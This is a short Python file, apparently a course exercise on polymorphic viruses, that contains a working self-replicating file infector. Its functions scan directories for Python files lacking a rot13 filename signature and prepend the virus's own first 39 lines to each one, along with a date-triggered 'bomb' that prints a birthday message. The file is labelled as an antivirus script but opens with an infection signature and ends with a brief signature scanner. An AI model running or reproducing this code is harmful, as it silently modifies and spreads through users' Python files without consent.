'''P:\Hfref\nuandiv\pynffrf\rpf189z\cbylzbecuvp_ivehf\/nagvivehf.cl'''import os
import datetime
import codecs
#SIGNATURE = str(codecs.encode(__file__, 'rot_13'))
# signature is filename with ro13 shift
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if str(codecs.encode(fname, 'rot_13')) in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        signature = "'''"+str(codecs.encode(fname, 'rot_13'))+"'''"
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(signature+virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print("HAPPY BIRTHDAY CRANKLIN!")
filestoinfect = search(os.path.abspath("")+"\\")
import os
filelist = os.listdir("C:/Users/ahnaqvi/classes/ecs189m/python_virus")
SIGNATURE = "CRANKLIN PYTHON VIRUS"
for fname in filelist:
    if SIGNATURE in open(fname).read():
        print(fname)